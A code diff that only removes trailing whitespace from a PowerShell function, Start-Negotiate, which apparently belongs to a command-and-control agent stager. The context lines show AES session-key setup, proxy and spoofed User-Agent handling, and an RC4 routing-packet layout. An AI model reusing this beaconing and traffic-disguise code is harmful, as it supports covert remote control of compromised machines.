@@ -104,7 +104,7 @@ function Start-Negotiate {
     catch {
         $AES=New-Object System.Security.Cryptography.RijndaelManaged;
     }
-    
+
     $IV = [byte] 0..255 | Get-Random -count 16;
     $AES.Mode="CBC";
     $AES.Key=$SKB;
@@ -139,10 +139,10 @@ function Start-Negotiate {
     }
 
     if ($Script:Proxy) {
-        $wc.Proxy = $Script:Proxy;   
+        $wc.Proxy = $Script:Proxy;
     }
 
-    
+
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
         $headers = $customHeaders -split ',';
@@ -157,7 +157,7 @@ function Start-Negotiate {
         }
     }
     $wc.Headers.Add("User-Agent",$UA);
-    
+
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -207,7 +207,7 @@ function Start-Negotiate {
     catch {
         $p = "[FAILED]"
     }
-   
+
 
     # check if the IP is a string or the [IPv4,IPv6] array
     $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
